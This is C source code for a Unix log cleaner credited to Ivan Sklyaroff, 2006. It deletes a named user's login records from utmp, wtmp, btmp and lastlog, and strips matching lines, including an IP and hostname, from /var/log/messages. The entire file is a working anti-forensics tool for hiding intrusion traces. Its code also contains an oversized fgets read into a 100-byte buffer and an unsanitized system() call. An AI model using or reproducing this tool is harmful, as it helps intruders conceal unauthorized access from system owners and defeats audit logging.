#include <stdio.h>
#include <stdlib.h>
#include <utmp.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <pwd.h>
#include <lastlog.h>
#include <string.h>

#define UTMP_FILE "/var/run/utmp"
#define WTMP_FILE "/var/log/wtmp"
#define BTMP_FILE "/var/log/btmp"
#define LASTLOG_FILE "/var/log/lastlog"
#define MESSAGES_FILE "/var/log/messages"
#define MAXBUFF 8*1024

copy_tmp(char *name_file)
{
  char buffer[100];

  sprintf(buffer, "cat ftmp > %s ; rm -f ftmp", name_file);
  printf("%s\n", buffer);

  if (system(buffer) < 0) {
    printf("Error!");
    exit(-1);
  }
}

dead_messages(char *name_file, char *username, char *tty, char *ip, char *hostname)
{
  char buffer[MAXBUFF];
  char buftmp[100];
  FILE *fd;
  FILE *fdtmp;

  if ( (fd = fopen(name_file, "r")) == 0) {
    perror(name_file);
    exit(-1);
  }

  if ( (fdtmp = fopen("ftmp", "w")) == 0) {
    perror(name_file);
    exit(-1);
  }

  while (fgets(buftmp, MAXBUFF, fd) != NULL)
  {
    if ( (strstr(buftmp, username)) ||
         (strstr(buftmp, tty)) )
	 continue;

    if (ip)
      if (strstr(buftmp, ip)) continue;
    
    if (hostname)
      if (strstr(buftmp, hostname)) continue;

    fputs(buftmp, fdtmp);
  }

  fclose(fd);
  fclose(fdtmp);

  copy_tmp(name_file);
}

dead_uwbtmp(char *name_file, char *username, char *tty)
{
  struct utmp pos;
  int fd;
  int fdtmp;

  if ( (fd = open(name_file, O_RDONLY)) == -1) {
    perror(name_file);
    return;
  }
  
  fdtmp = open("ftmp", O_WRONLY | O_CREAT);

  while (read(fd, &pos, sizeof(struct utmp)) > 0)
  {
    if ( (!strncmp(pos.ut_name, username, sizeof(pos.ut_name))) &&
         (!strncmp(pos.ut_line, tty, sizeof(pos.ut_line))) )
	 continue;
	   
    write(fdtmp, &pos, sizeof(struct utmp));
  }

  close(fd);
  close(fdtmp);
  
  copy_tmp(name_file);
}

dead_lastlog (char *name_file, char *username)
{
  struct passwd *pwd;
  struct lastlog pos;
  int fd;

  if ( (pwd = getpwnam(username)) != NULL)
  {  
    if ( (fd = open(name_file, O_RDWR)) < 0) {
      perror(name_file);
      exit(-1);
    }
    
    lseek(fd, (long)pwd->pw_uid * sizeof(struct lastlog), SEEK_SET); 
    pos.ll_time = 0;
    strcpy(pos.ll_line, " ");
    strcpy(pos.ll_host, " ");
    write(fd, (char *)&pos, sizeof(struct lastlog));
    
    close(fd);
  }
}

int main(int argc, char *argv[])
{
  char *username;
  char *tty;
  char *ip;
  char *hostname;

  if ((argc < 3) || (argc > 5)) {
    printf("Usage: %s <username> <tty> [IP] [hostname]\n\n", argv[0]);
    exit(-1);
  }

  fprintf(stderr, "========================================\n");  
  fprintf(stderr, "= Log-cleaner by Ivan Sklyaroff, 2006. =\n");
  fprintf(stderr, "========================================\n");
  
  username = argv[1];
  tty      = argv[2];
  ip       = (argc > 3) ? argv[3] : NULL;
  hostname = (argc > 4) ? argv[4] : NULL;

  dead_uwbtmp(UTMP_FILE, username, tty);
  printf("utmp ok!\n");
  dead_uwbtmp(WTMP_FILE, username, tty);
  printf("wtmp ok!\n");
  dead_uwbtmp(BTMP_FILE, username, tty);
  printf("btmp ok!\n");
  dead_lastlog(LASTLOG_FILE, username);
  printf("lastlog ok!\n");
  dead_messages(MESSAGES_FILE, username, tty, ip, hostname);
  printf("messages ok!\n");

  return 0;
}
